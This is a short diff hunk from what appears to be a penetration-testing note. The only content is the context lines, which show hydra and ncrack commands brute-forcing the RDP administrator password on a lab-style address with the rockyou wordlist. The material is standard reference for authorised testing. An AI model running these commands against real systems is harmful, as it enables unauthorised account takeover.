@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:25:55.682065+00:00'
 hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
 ncrack --connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
 ```
+
+
